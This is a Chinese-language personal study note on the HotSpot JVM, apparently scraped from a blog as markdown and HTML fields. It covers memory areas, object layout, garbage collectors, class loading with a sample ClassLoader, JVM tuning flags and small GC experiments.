HotSpot中译本P57注释有 “实际上，HotSpot VM的FullGC收集整个堆，包括新生代、老年代、永生代” 过早提升：Minor GC时，to survivor空间不足，所以多余对象移到老年代 提升失败：Minor GC过程中，老年代满了，所以需要Full GC（这需要遍历整个java堆） 大对象可能直接分配到老年代 各种GC Serial 单线程Stop-The-World式收集器 新生代使用复制收集算法（如同上面MinorGC那里描述的那样） 可以与CMS配合 应用场景 如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial就很好。 client模式下新生代的默认收集器（jdk7时？） Serial Old 单线程Stop-The-World式收集器 Serial的老年代版本 使用标记清除压缩收集算法，回收时找出所有的存活对象，然后滑动到堆的头部 应用场景 如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial Old就很好。 主要给Client模式下的虚拟机用 在Server模式下,那么它主要还有两大用途 一种用途是在JDK 1.5以及之前的版本中与Parallel Scavenge收集器搭配使用 Parallel Scavenge收集器架构中本身有PS MarkSweep收集器来进行老年代收集,并非直接使用了Serial Old收集器,但是这个PS MarkSweep收集器与Serial Old的实现非常接近,所以在官方的许多资料中都是直接以Serial Old代替PS MarkSweep进行讲解 另一种用途就是作为CMS收集器的后备预案,在并发收集发生Concurrent Mode Failure时使用 ParNew: Serial的多线程版本（除了多线程，与Serial差别没有差别） 新生代的收集器 可以与CMS配合 应用场景 运行于Server模式下的首选新生代收集器（jdk7时？），因为除了serial，只有它能与CMS配合 Parallel Scavenge 又叫吞吐量优先处理器 新生代的收集器 多线程Stop-The-World式收集器，采用复制收集算法 Parallel Scavenge收集器的目标则是达到一个可控制的吞吐量 不能与CMS配合 自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别 Parallel Scavenge收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码 -XX:MaxGCPauseMillis：参数设置最大垃圾收收集停顿时间。GC停顿时间缩短是以牺牲吞吐量和新生代空间来换取的，设得过小可能导致频繁GC -XX:GCTimeRatio：设置吞吐量，为大于0小于100的整数，设为$x$的含义是GC时间占$\\frac{1}{x+1}$，默认是99 -XX:+UseAdaptiveSizePolicy：打开后，就不需要手工指定新生代的大小(-Xmn)、Eden与Survivor区的比例、晋升老年代对象年龄等细节参数了 Parallel Old Parallel Scavenge收集器的老年代版本 使用多线程和“标记-整理”算法 这个收集器是在JDK 1.6中才开始提供的，以前只能让Parallel Scavenge与Serial Old配合 在注重吞吐量以及CPU资源敏感的场合,都可以优先考虑Parallel Scavenge加Parallel Old收集器 CMS(Concurrent Mark Sweep) 老年代的收集器 以获取最短回收停顿时间为目标的收集器 使用多线程、标记-清除算法 它第一次实现了让垃圾收集线程与用户线程(基本上)同时工作 尽可能并发、低停顿式的收集器，独立于HotSpot分代式GC框架另行实现的并行收集器 整个过程分为四个步骤：初始标记、并发标记、重新标记、并发清除 初始标记、重新标记这两个步骤仍然需要“Stop The World”。初始标记仅仅只是标记一下GC Roots能直接关联到的对象,速度很快,并发标记阶段就是进行GC RootsTracing的过程,而重新标记阶段则是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录,这个阶段的停顿时间一般会比初始标记阶段稍长一些,但远比并发标记的时间短。由于整个过程中耗时最长的并发标记和并发清除过程收集器线程都可以与用户线程一起工作 缺点 对CPU资源敏感（默认启动的回收线程是$(\\text{CPU数量}+3)/4$） 由于在垃圾收集阶段用户线程还需要运行，所以无法处理浮动垃圾，可能出现Concurrent Mode Failure失败而导致另一次FullGC 要是CMS运行期间预留的内存无法满足程序需要,就会出现一次Concurrent Mode Failure失败,这时虚拟机将启动后备预案:临时启用Serial Old收集器来重新进行老年代的垃圾收集,这样停顿时间就很长了 由于在垃圾收集阶段用户线程还需要运行,那也就还需要预留有足够的内存空间给用户线程使用,因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集,需要预留一部分空间提供并发收集时的程序运作使用（可以通过XX:CMSInitiatingOccupancyFraction调高触发百分比，不过如果过高，就会出现Concurrent Mode Failure） 基于标记-清除算法，所以会有大量空间碎片，导致可能提前触发FullGC 为了解决这个问题,CMS收集器提供了一个XX:+UseCMSCompactAtFullCollection开关参数(默认就是开启的),用于在CMS收集器顶不住要进行FullGC时开启内存碎片的合并整理过程,内存整理的过程是无法并发的,空间碎片问题没有了,但停顿时间不得不变长 虚拟机设计者还提供了另外一个参数-XX:CMSFullGCsBeforeCompaction,这个参数是用于设置执行多少次不压缩的Full GC后,跟着来一次带压缩的(默认值为0,表示每次进入Full GC时都进行碎片整理)。 G1 G1收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码 面向服务端 类加载 在实际情况中， 每个Class文件都有可能代表着Java语言中的一个类或接口， 后文中直接对“类”的描述都包括了类和接口的可能性 链接 在Java语言里面，类型的加载、 连接和初始化过程都是在程序运行期间完成的， 这种策略虽然会令类加载时稍微增加一些性能开销， 但是会为Java应用程序提供高度的灵活性，例如在运行时才指定某个接口的实现类 验证、准备、解析三个部分统称为连接 生命周期 加载（loading） 验证 准备 解析 初始化 使用 卸载 ClassLoader例子123456789101112131415161718private final ClassLoader myLoader = new ClassLoader() &#123; @Override public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; try &#123; String fileName = name.substring(name.lastIndexOf(\".\") + 1) + \".class\"; InputStream is = getClass().getResourceAsStream(fileName); if (is == null) &#123; System.out.println(\"use super loader\"); return super.loadClass(name); &#125; byte[] b = new byte[is.available()]; is.read(b); return defineClass(name, b, 0, b.length); &#125; catch (IOException e) &#123; throw new ClassNotFoundException(name); &#125; &#125;&#125;; 参数 以下可能有HotSpot专有的参数 -Xms： the initial memory sizes available to the JVM -Xmx： the maximum memory sizes available to the JVM -Xms, -Xmx：用于JVM heap。Increasing the amount of memory available can improve performance, but increasing it to too high a value can have a detrimental effect in the form of longer pauses for full garbage collection runs. Therefore, the initial and maximum sizes should be set to the same value. -Xmn：新生代大小 -XX:SurvivorRatio：Eden与Survivor区的比例 -XX:PretenureSizeThreshold：晋升老年代对象的年龄 -Xss：栈容量 -Xoss：本地方法栈大小（因为HotSpot不区分虚拟机栈和本地方法栈，所以该参数无效） -XX:MaxDirectMemorySize：本地直接内存的最大容量。默认与java堆最大值一样 -Xnoclassgc：是否对类进行回收（HotSpot VM） -verbose:class, -XX:+TraceClassLoading, -XX:+TraceClassUnLoading：查看类加载卸载信息。第三个需要FastDebug版虚拟机支持 -XX:+/-UseTLAB：是否启用本地线程分配缓存 Xlog:gc*, -XX:+PrintGCDetails：打印GC日志 -XX:MaxTenuringThreshold：晋升老年代的年龄阀值 -XX:+PrintReferenceGC：GC时打印finalReference的信息 -XX:+PrintGCApplicationStoppedTime：打印到达安全点的信息 -XX:UseCompressedOops：开启压缩指针 -XX:PretenureSizeThreshold：大于这个设置值的对象直接在老年代分配。这样做的目的是避免在Eden区及两个Survivor区之间发生大量的内存复制（因为新生代采用复制算法收集内存） PretenureSizeThreshold参数只对Serial和ParNew两款收集器有效， Parallel Scavenge收集器不认识这个参数， Parallel Scavenge收集器一般并不需要设置。 如果遇到必须使用此参数的场合，可以考虑ParNew加CMS的收集器组合。 实验和调优本地方法栈 HotSpot，单线程下怎样测试都只抛出StackOverflowError，所以StackOverflowError应该不是因为调用深度超过某个值就抛出，而是内存不足导致抛出（所以相应减小栈上变量的总大小，可以提高栈深度） 如果是建立过多线程导致的内存溢出，在不能减少线程数或者更换64位虚拟机的情况下， 就只能通过减少最大堆和减少栈容量来换取更多的线程 GC 大对象对GC不友好，经常出现大对象容易导致内存还有不少空间时就提前触发垃圾收集以获取足够的连续空间来“安置”它们。写程序时应当避免“短命大对象”。 局部变量表的slot复用与GC 代码1 1234567class Test &#123; public static void main(String[] args) &#123; byte[] placeHolder = new byte[1024 * 1024 * 64]; System.gc(); // gc后，placeHolder没有被gc掉 &#125;&#125; 代码2 123456789class Test2 &#123; public static void main(String[] args) &#123; &#123; byte[] placeHolder = new byte[1024 * 1024 * 64]; &#125; System.gc(); // gc后，placeHolder没有被gc掉 &#125;&#125; 代码3 12345678910class Test3 &#123; public static void main(String[] args) &#123; &#123; byte[] placeHolder = new byte[1024 * 1024 * 64]; &#125; int a = 0; System.gc(); // gc后，placeHolder被gc掉 &#125;&#125; 如果遇到一个方法，其后面的代码有一些耗时很长的操作，而前面又定义了占用了大量内存、实际上已经不会再使用的变量，手动将其设置为null值（用来代替那句int a=0，把变量对应的局部变量表Slot清空）便不见得是一个绝对无意义的操作，这种操作可以作为一种在极特殊情形（对象占用内存大、此方法的栈帧长时间不能被回收、方法调用次数达不到JIT的编译条件）下的“奇技”来使用。 从编码角度讲， 以恰当的变量作用域来控制变量回收时间才是最优雅的解决方法， 如代码清单8-3那样的场景并不多见。 更关键的是， 从执行角度讲， 使用赋null值的操作来优化内存回收是建立在对字节码执行引擎概念模型的理解之上的，但是实际执行中，与概念模型差别很大，所以赋null可能无必要（然而我自己使用java11，上面那个测试代码，G1，似乎没有int a=0就没有回收）","raw":"---\ntitle: My JVM Note\ndate: 2019-03-02 12:49:04\ncategories:\n- JAVA\n- JVM\n---\n\n> 本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7\n\n### Override\n\n- 准确式内存管理：即虚拟机可以知道内存中某个位置的数据具体是什么类型\n- \n\n### 运行时数据区域\n\n- 方法区\n  - 线程共享\n\n  - 存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等\n\n  - 虚拟机规范把方法区描述为堆的一个逻辑部分（但是有一个别名：Non-Heap）\n\n  - HotSpot用永久代实现。其他虚拟机并没有永久代这个概念\n\n    > 但使用永久代来实现方法区，现在看来并不是一个好主意，因为这样更容易遇到内存溢出问题（永久代有`-XX:MaxPermSize`的上限，J9和JRockit只要没有触碰到进程可用内存的上限，例如32位系统中的4GB，就不会出现问题），而且有极少数方法（例如`String.intern()`）会因这个原因导致不同虚拟机下有不同的表现。\n\n  - 规范要求，可以不需要连续的内存（连续的的物理内存？），可以固定大小或可扩展，可以不实现垃圾收集\n\n  - 有OutOfMemoryError异常\n- 运行时常量池\n  - 方法区的一部分\n  - class文件中的常量池在类加载后就放入这里\n  - 规范没有做细节要求。一般来说,除了保存Class文件中描述的符号引用外,还会把翻译出来的直接引用也存储在运行时常量池中\n  - 具有动态性。运行期可以把新的常量放进池中（比如`String.intern()`）\n- 直接内存\n  - 不是虚拟机运行时数据区的一部分，也不是规范中定义的内存区域\n\n  - NIO可以直接操作堆外的内存\n\n    > 在JDK1.4中新加入了NIO（NewInput/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆中的DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。\n\n  - 可能出现OOM异常\n\n  - 这里的内存溢出，明显的特征是HeapDum文件中不会看到明显的异常，并且可能Dump文件很小\n- 堆\n  - 存放对象实例\n  - 垃圾收集器管理的主要区域\n  - 线程共享。虚拟机启动时创建\n  - 可以划分出多个线程私有的分配缓冲区\n  - 有OutOfMemoryError异常\n  - 规范要求，可以处于物理上不连续的内存空间，只要逻辑上连续即可。可以是可扩展或固定大小\n- 虚拟机栈\n  - 线程私有。生命周期与线程相同\n  - 栈帧中有：局部变量表（方法运行期不会改变大小，存有基本数据类型、对象引用、returnAddress类型）、操作数栈、动态链接、方法出口等信息\n  - 方法调用对应于一个栈帧在虚拟机栈的入栈到出栈过程\n  - 有StackOverflowError异常、OutOfMemoryError异常（只有可以动态扩展虚拟机栈的虚拟机再有OOM异常）\n- 本地方法栈\n  - 类似于虚拟机栈\n  - 线程私有、生命周期与线程相同\n  - 具体的虚拟机可以自由实现\n  - 有StackOverflowError和OutOfMemoryError异常\n  - 在HotSpot虚拟机中并不区分虚拟机栈和本地方法栈\n- 程序计数器\n  - 线程私有、生命周期与线程相同\n  - 没有任何OutOfMemoryError情况\n\n### **HotSpot**在Java堆中对象的创建、布局、访问\n\n##### 创建\n\n> 以下仅限于普通对象，不包括数组和class对象\n\n- 当遇到new指令时\n  - 在常量池定位这个类的符号引用，并检查该类是否已被加载、解析和初始化过。如果没有要执行对应的加载过程\n  - 为新生对象分配内存（指针碰撞、空闲列表、TLAB）（在类加载后对象所需的内存便可完全确定）\n  - 把分配到的内存空间都初始为0值（如果是TLAB，可以提前到TLAB分配时进行）\n  - 设置对象头（哪个类的实例、如何找到类的元数据信息、对象的hashCode、对象的GC分代年龄等。根据是否启用偏向锁，对象头会有不同的设置方式）\n  - 截止以上，从虚拟机的角度看，新对象已经产生了\n  - 一般来说（由字节码中是否跟随invokespecial指令所决定），执行new指令之后会接着执行`<init>` 方法， 把对象按照程序员的意愿进行初始化， 这样一个真正可用的对象才算完全产生出来\n\n##### 布局\n\n- 对象在内存中的布局有：对象头、实例数据、对齐填充\n- 对象头\n  - 第一部分用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等\n  - 第二部分是类型指针，即指向类元数据的指针\n  - 如果是数组，还要有一块用于记录长度\n- 实例数据\n  - 程序代码中所定义的各种类型的字段内容（包括从父类继承和子类中定义的）\n  - 存储顺序会受到虚拟机分配策略参数（FieldsAllocationStyle） 和字段在Java源码中定义顺序的影响\n  - 默认的分配策略是\n    - 相同宽度字段被分配在一起\n      - `longs/doubles`\n      - `ints`\n      - `shorts/chars`\n      - `bytes/booleans`\n      - `oops`(ordinary object pointers)（有个问题，指针不是64bit吗？）\n    - 满足上面那个条件后，父类定义的出现在子类之前\n    - 如果CompactFields参数值为true（默认为true），那么子类之中较窄的变量也可能会插入到父类变量的空隙之中\n- padding\n  - 由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，所以可能需要padding\n\n##### 定位和访问\n\n- HotSpot使用直接指针。另一种方式是句柄（不是HotSpot采用的）\n- 句柄\n  - 需要在java堆中有句柄池\n  - 句柄中包含对象的实例数据和类型数据的各自具体地址\n  - 在对象被移动时，无需更新reference数据\n\n### 类加载的时机\n\n> 注意，这一部分JVM有明确规定，但不知道是否有一些是实现相关的。我试验时用的是HotSpot，openJDK 1.8，client模式下\n\n- 按照作者说法\n\n  > 常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化\n\n  在实验中\n\n  ```java\n  class InitTest {\n      public static void main(String[] args) {\n          System.out.println(Holder.str3);\n          // 如果是输出str，则不会输出`Init Holder`\n          // 如果是输出str2和str3则会\n      }\n  \n      static class Holder {\n          public final static String str = \"Hello\";\n          public final static String str2 = new String(\"NewString\");\n          public final static String str3 = String.valueOf(\"Str3\");\n  \n          static {\n              System.out.println(\"Init Holder\");\n          }\n      }\n  }\n  ```\n\n\n### HotSpot VM的结构\n\n- GC（可插拔）\n- JIT（可插拔）\n- runtime\n\n### HotSpot Runtime\n\n##### 职责\n\n- parsing of command line arguments\n- VM life cycle\n- class loading,\n- byte code interpreter\n- exception handling\n- synchronization\n- thread management\n- Java Native Interface\n- VM fatal error handling\n- C++ (non-Java) heap management.\n\n### GC\n\n- 程序计数器、虚拟机栈、本地方法栈3个区域需要的内存**基本上**在类结构确定时就已知（JIT优化会有所改变），并且生命周期与线程、方法的进入退出相同，所以内存回收是确定的\n- java堆和方法区需要的内存则需要运行时才知道，分配回收都是动态的，所以需要GC\n- 吞吐量=运行用户代码时间/(运行用户代码时间+垃圾收集时间)\n\n##### GC的3件事\n\n- 哪些内存需要回收？\n- 什么时候回收？\n- 如何回收？\n\n##### 可作为CG Roots的对象\n\n- 虚拟机栈（栈帧中的本地变量表） 中引用的对象\n- 方法区中类静态属性引用的对象\n- 方法区中常量引用的对象\n- 本地方法栈中JNI（即一般说的Native方法） 引用的对象\n\n##### 强、软、弱、虚引用\n\n- 强引用：只要还存在，GC永远不会回收被引用对象\n- 软引用：对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收。如果这次回收还没有足够的内存，才会抛出内存溢出异常\n- 弱引用：被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象\n- 虚引用：也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知\n\n##### Hotspot GC\n\n- Minor GC：新生代的GC，Eden空间的存活对象和from survivor空间的不够老的存活对象复制到to survivor空间，from survivor空间中足够老的对象提升为老年代。结束后，Eden空间一般是全空的（也有不空的情况）。只要追求速度，空间利用率会低一些\n\n- Major GC（Full GC）：老年代GC, Major GC经常会伴随至少一次的Minor GC（但非绝对的， 在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程） 。 Major GC的速度一般会比Minor GC慢10倍以上\n\n  > *java performance* HotSpot中译本P57注释有\n  >\n  > “实际上，HotSpot VM的FullGC收集整个堆，包括新生代、老年代、永生代”\n\n- 过早提升：Minor GC时，to survivor空间不足，所以多余对象移到老年代\n\n- 提升失败：Minor GC过程中，老年代满了，所以需要Full GC（这需要遍历整个java堆）\n\n- 大对象可能直接分配到老年代\n\n###### 各种GC\n\n- Serial\n  - 单线程Stop-The-World式收集器\n  - 新生代使用复制收集算法（如同上面MinorGC那里描述的那样）\n  - 可以与CMS配合\n  - 应用场景\n    - 如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial就很好。\n    - client模式下新生代的默认收集器（jdk7时？）\n\n- Serial Old\n\n  - 单线程Stop-The-World式收集器\n\n  - Serial的老年代版本\n\n  - 使用标记清除压缩收集算法，回收时找出所有的存活对象，然后滑动到堆的头部\n\n  - 应用场景\n\n    - 如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial Old就很好。\n\n    - 主要给Client模式下的虚拟机用\n\n    - 在Server模式下,那么它主要还有两大用途\n\n      - 一种用途是在JDK 1.5以及之前的版本中与Parallel Scavenge收集器搭配使用\n\n        > Parallel Scavenge收集器架构中本身有PS MarkSweep收集器来进行老年代收集,并非直接使用了Serial Old收集器,但是这个PS MarkSweep收集器与Serial Old的实现非常接近,所以在官方的许多资料中都是直接以Serial Old代替PS MarkSweep进行讲解\n\n      - 另一种用途就是作为CMS收集器的后备预案,在并发收集发生Concurrent Mode Failure时使用\n\n- ParNew:\n\n  - Serial的多线程版本（除了多线程，与Serial差别没有差别）\n  - 新生代的收集器\n  - 可以与CMS配合\n  - 应用场景\n    - 运行于Server模式下的首选新生代收集器（jdk7时？），因为除了serial，只有它能与CMS配合\n\n- Parallel Scavenge\n\n  - 又叫吞吐量优先处理器\n  - 新生代的收集器\n  - 多线程Stop-The-World式收集器，采用复制收集算法\n  - Parallel Scavenge收集器的目标则是达到一个可控制的吞吐量\n  - 不能与CMS配合\n  - 自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别\n  - Parallel Scavenge收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码\n  - `-XX:MaxGCPauseMillis`：参数设置最大垃圾收收集停顿时间。GC停顿时间缩短是以牺牲吞吐量和新生代空间来换取的，设得过小可能导致频繁GC\n  - `-XX:GCTimeRatio`：设置吞吐量，为大于0小于100的整数，设为$x$的含义是GC时间占$\\frac{1}{x+1}$，默认是99\n  - `-XX:+UseAdaptiveSizePolicy`：打开后，就不需要手工指定新生代的大小(-Xmn)、Eden与Survivor区的比例、晋升老年代对象年龄等细节参数了\n\n- Parallel Old\n\n  - Parallel Scavenge收集器的老年代版本\n  - 使用多线程和“标记-整理”算法\n  - 这个收集器是在JDK 1.6中才开始提供的，以前只能让Parallel Scavenge与Serial Old配合\n  - 在注重吞吐量以及CPU资源敏感的场合,都可以优先考虑Parallel Scavenge加Parallel Old收集器\n\n- CMS(Concurrent Mark Sweep)\n\n  - 老年代的收集器\n\n  - 以获取最短回收停顿时间为目标的收集器\n\n  - 使用多线程、标记-清除算法\n\n  - 它第一次实现了让垃圾收集线程与用户线程(基本上)同时工作\n\n  - 尽可能并发、低停顿式的收集器，独立于HotSpot分代式GC框架另行实现的并行收集器\n\n  - 整个过程分为四个步骤：初始标记、并发标记、重新标记、并发清除\n\n    > 初始标记、重新标记这两个步骤仍然需要“Stop The World”。初始标记仅仅只是标记一下GC Roots能直接关联到的对象,速度很快,并发标记阶段就是进行GC RootsTracing的过程,而重新标记阶段则是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录,这个阶段的停顿时间一般会比初始标记阶段稍长一些,但远比并发标记的时间短。由于整个过程中耗时最长的并发标记和并发清除过程收集器线程都可以与用户线程一起工作\n\n  - 缺点\n\n    - 对CPU资源敏感（默认启动的回收线程是$(\\text{CPU数量}+3)/4$）\n\n    - 由于在垃圾收集阶段用户线程还需要运行，所以无法处理浮动垃圾，可能出现`Concurrent Mode Failure`失败而导致另一次FullGC\n\n      > 要是CMS运行期间预留的内存无法满足程序需要,就会出现一次`Concurrent Mode Failure`失败,这时虚拟机将启动后备预案:临时启用Serial Old收集器来重新进行老年代的垃圾收集,这样停顿时间就很长了\n\n    - 由于在垃圾收集阶段用户线程还需要运行,那也就还需要预留有足够的内存空间给用户线程使用,因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集,需要预留一部分空间提供并发收集时的程序运作使用（可以通过`XX:CMSInitiatingOccupancyFraction`调高触发百分比，不过如果过高，就会出现`Concurrent Mode Failure`）\n\n    - 基于标记-清除算法，所以会有大量空间碎片，导致可能提前触发FullGC\n\n      > - 为了解决这个问题,CMS收集器提供了一个`XX:+UseCMSCompactAtFullCollection`开关参数(默认就是开启的),用于在CMS收集器顶不住要进行FullGC时开启内存碎片的合并整理过程,内存整理的过程是无法并发的,空间碎片问题没有了,但停顿时间不得不变长\n      > - 虚拟机设计者还提供了另外一个参数`-XX:CMSFullGCsBeforeCompaction`,这个参数是用于设置执行多少次不压缩的Full GC后,跟着来一次带压缩的(默认值为0,表示每次进入Full GC时都进行碎片整理)。\n\n- G1\n\n  - G1收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码\n  - 面向服务端\n\n### 类加载\n\n> 在实际情况中， 每个Class文件都有可能代表着Java语言中的一个类或接口， 后文中直接对“类”的描述都包括了类和接口的可能性\n\n##### 链接\n\n- 在Java语言里面，类型的加载、 连接和初始化过程都是在程序运行期间完成的， 这种策略虽然会令类加载时稍微增加一些性能开销， 但是会为Java应用程序提供高度的灵活性，例如在运行时才指定某个接口的实现类\n- 验证、准备、解析三个部分统称为连接\n\n##### 生命周期\n\n- 加载（loading）\n- 验证\n- 准备\n- 解析\n- 初始化\n- 使用\n- 卸载\n\n##### ClassLoader例子\n\n```java\n private final ClassLoader myLoader = new ClassLoader() {\n     @Override\n     public Class<?> loadClass(String name) throws ClassNotFoundException {\n         try {\n             String fileName = name.substring(name.lastIndexOf(\".\") + 1) + \".class\";\n             InputStream is = getClass().getResourceAsStream(fileName);\n             if (is == null) {\n                 System.out.println(\"use super loader\");\n                 return super.loadClass(name);\n             }\n             byte[] b = new byte[is.available()];\n             is.read(b);\n             return defineClass(name, b, 0, b.length);\n         } catch (IOException e) {\n             throw new ClassNotFoundException(name);\n         }\n     }\n };\n```\n\n### 参数\n\n> 以下可能有HotSpot专有的参数\n\n- `-Xms`： the initial memory sizes available to the JVM\n\n- `-Xmx`： the maximum memory sizes available to the JVM\n\n- `-Xms`, `-Xmx`：用于JVM heap。Increasing the amount of memory available can improve performance, but increasing it to too high a value can have a detrimental effect in the form of longer pauses for full garbage collection runs. Therefore, the initial and maximum sizes should be set to the same value.\n\n- `-Xmn`：新生代大小\n\n- `-XX:SurvivorRatio`：Eden与Survivor区的比例\n\n- `-XX:PretenureSizeThreshold`：晋升老年代对象的年龄\n\n- `-Xss`：栈容量\n\n- `-Xoss`：本地方法栈大小（因为HotSpot不区分虚拟机栈和本地方法栈，所以该参数无效）\n\n- `-XX:MaxDirectMemorySize`：本地直接内存的最大容量。默认与java堆最大值一样\n\n- `-Xnoclassgc`：是否对类进行回收（HotSpot VM）\n\n- `-verbose:class`, `-XX:+TraceClassLoading`, `-XX:+TraceClassUnLoading`：查看类加载卸载信息。第三个需要FastDebug版虚拟机支持\n\n- `-XX:+/-UseTLAB`：是否启用本地线程分配缓存\n\n- `Xlog:gc*`, `-XX:+PrintGCDetails`：打印GC日志\n\n- `-XX:MaxTenuringThreshold`：晋升老年代的年龄阀值\n\n- `-XX:+PrintReferenceGC`：GC时打印finalReference的信息\n\n- `-XX:+PrintGCApplicationStoppedTime`：打印到达安全点的信息\n\n- `-XX:UseCompressedOops`：开启压缩指针\n\n- `-XX:PretenureSizeThreshold`：大于这个设置值的对象直接在老年代分配。这样做的目的是避免在Eden区及两个Survivor区之间发生大量的内存复制（因为新生代采用复制算法收集内存）\n\n  > PretenureSizeThreshold参数只对Serial和ParNew两款收集器有效， Parallel Scavenge收集器不认识这个参数， Parallel Scavenge收集器一般并不需要设置。 如果遇到必须使用此参数的场合，可以考虑ParNew加CMS的收集器组合。\n\n\n### 实验和调优\n\n##### 本地方法栈\n\n- HotSpot，单线程下怎样测试都只抛出`StackOverflowError`，所以`StackOverflowError`应该不是因为调用深度超过某个值就抛出，而是内存不足导致抛出（所以相应减小栈上变量的总大小，可以提高栈深度）\n- 如果是建立过多线程导致的内存溢出，在不能减少线程数或者更换64位虚拟机的情况下， 就只能通过减少最大堆和减少栈容量来换取更多的线程\n\n##### GC\n\n-  大对象对GC不友好，经常出现大对象容易导致内存还有不少空间时就提前触发垃圾收集以获取足够的连续空间来“安置”它们。写程序时应当避免“短命大对象”。\n\n##### 局部变量表的slot复用与GC\n\n- 代码1\n\n  ```java\n  class Test {\n      public static void main(String[] args) {\n          byte[] placeHolder = new byte[1024 * 1024 * 64];\n          System.gc();\n          // gc后，placeHolder没有被gc掉\n      }\n  }\n  ```\n\n- 代码2\n\n  ```java\n  class Test2 {\n      public static void main(String[] args) {\n          {\n              byte[] placeHolder = new byte[1024 * 1024 * 64];\n          }\n          System.gc();\n          // gc后，placeHolder没有被gc掉\n      }\n  }\n  ```\n\n- 代码3\n\n  ```java\n  class Test3 {\n      public static void main(String[] args) {\n          {\n              byte[] placeHolder = new byte[1024 * 1024 * 64];\n          }\n          int a = 0;\n          System.gc();\n          // gc后，placeHolder被gc掉\n      }\n  }\n  ```\n\n- > 如果遇到一个方法，其后面的代码有一些耗时很长的操作，而前面又定义了占用了大量内存、实际上已经不会再使用的变量，手动将其设置为null值（用来代替那句`int a=0`，把变量对应的局部变量表Slot清空）便不见得是一个绝对无意义的操作，这种操作可以作为一种在极特殊情形（对象占用内存大、此方法的栈帧长时间不能被回收、方法调用次数达不到JIT的编译条件）下的“奇技”来使用。\n\n- > 从编码角度讲， 以恰当的变量作用域来控制变量回收时间才是最优雅的解决方法， 如代码清单8-3那样的场景并不多见。 更关键的是， 从执行角度讲， 使用赋null值的操作来优化内存回收是建立在对字节码执行引擎概念模型的理解之上的，但是实际执行中，与概念模型差别很大，所以赋null可能无必要（然而我自己使用java11，上面那个测试代码，G1，似乎没有`int a=0`就没有回收）\n","content":"<blockquote>\n<p>本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7</p>\n</blockquote>\n<h3 id=\"Override\"><a href=\"#Override\" class=\"headerlink\" title=\"Override\"></a>Override</h3><ul>\n<li>准确式内存管理：即虚拟机可以知道内存中某个位置的数据具体是什么类型</li>\n<li></li>\n</ul>\n<h3 id=\"运行时数据区域\"><a href=\"#运行时数据区域\" class=\"headerlink\" title=\"运行时数据区域\"></a>运行时数据区域</h3><ul>\n<li><p>方法区</p>\n<ul>\n<li><p>线程共享</p>\n</li>\n<li><p>存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等</p>\n</li>\n<li><p>虚拟机规范把方法区描述为堆的一个逻辑部分（但是有一个别名：Non-Heap）</p>\n</li>\n<li><p>HotSpot用永久代实现。其他虚拟机并没有永久代这个概念</p>\n<blockquote>\n<p>但使用永久代来实现方法区，现在看来并不是一个好主意，因为这样更容易遇到内存溢出问题（永久代有<code>-XX:MaxPermSize</code>的上限，J9和JRockit只要没有触碰到进程可用内存的上限，例如32位系统中的4GB，就不会出现问题），而且有极少数方法（例如<code>String.intern()</code>）会因这个原因导致不同虚拟机下有不同的表现。</p>\n</blockquote>\n</li>\n<li><p>规范要求，可以不需要连续的内存（连续的的物理内存？），可以固定大小或可扩展，可以不实现垃圾收集</p>\n</li>\n<li><p>有OutOfMemoryError异常</p>\n</li>\n</ul>\n</li>\n<li>运行时常量池<ul>\n<li>方法区的一部分</li>\n<li>class文件中的常量池在类加载后就放入这里</li>\n<li>规范没有做细节要求。一般来说,除了保存Class文件中描述的符号引用外,还会把翻译出来的直接引用也存储在运行时常量池中</li>\n<li>具有动态性。运行期可以把新的常量放进池中（比如<code>String.intern()</code>）</li>\n</ul>\n</li>\n<li><p>直接内存</p>\n<ul>\n<li><p>不是虚拟机运行时数据区的一部分，也不是规范中定义的内存区域</p>\n</li>\n<li><p>NIO可以直接操作堆外的内存</p>\n<blockquote>\n<p>在JDK1.4中新加入了NIO（NewInput/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆中的DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。</p>\n</blockquote>\n</li>\n<li><p>可能出现OOM异常</p>\n</li>\n<li><p>这里的内存溢出，明显的特征是HeapDum文件中不会看到明显的异常，并且可能Du